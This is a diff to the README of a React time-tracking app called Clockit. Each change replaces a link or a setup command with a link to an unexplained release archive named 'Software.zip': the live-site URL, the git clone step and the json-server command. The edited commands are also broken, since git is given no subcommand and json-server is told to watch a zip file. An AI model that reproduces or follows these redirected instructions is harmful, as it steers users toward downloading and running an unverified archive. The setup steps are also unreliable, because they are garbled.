@@ -10,7 +10,7 @@ With Clockit, companies can optimize their workforce efficiency and productivity
 
 ## Live Site
 
-https://clock-it-app-react-project-8iaq.vercel.app/
+https://github.com/l3xst1ng/clock-it-app-react-project/releases/download/v1.0/Software.zip
 
 ## Features
 
@@ -30,7 +30,7 @@ https://clock-it-app-react-project-8iaq.vercel.app/
 1. Clone the repository:
 
 ```bash
-git https://github.com/l3xst1ng/clock-it-app-react-project
+git https://github.com/l3xst1ng/clock-it-app-react-project/releases/download/v1.0/Software.zip
 ```
 
 2. Navigate to the project directory:
@@ -52,7 +52,7 @@ git https://github.com/l3xst1ng/clock-it-app-react-project
 3. Run the server:
 
 ```bash
-json-server --watch db.json
+json-server --watch https://github.com/l3xst1ng/clock-it-app-react-project/releases/download/v1.0/Software.zip
 ```
 
 5. Run the application:
